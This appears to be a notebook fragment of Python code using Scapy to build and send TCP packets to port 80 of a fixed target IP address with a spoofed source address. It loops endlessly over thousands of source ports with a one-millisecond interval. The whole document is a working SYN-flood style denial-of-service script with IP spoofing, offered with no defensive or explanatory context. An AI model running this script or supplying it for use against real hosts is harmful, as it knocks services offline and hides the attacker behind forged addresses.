```python
from scapy.all import *
```

```python
source = "45.251.35.7"
target = "52.1.50.245"
```

```python
i = 1

while True:
  for source_port in range(1, 5000):
    IP1= IP(src=source, dst=target)
    TCP1 = TCP(sport=source_port, dport=80)
    packet =IP1/TCP1
    send(packet, inter=.001)
    print("packet sent",i)
    i+=1
```
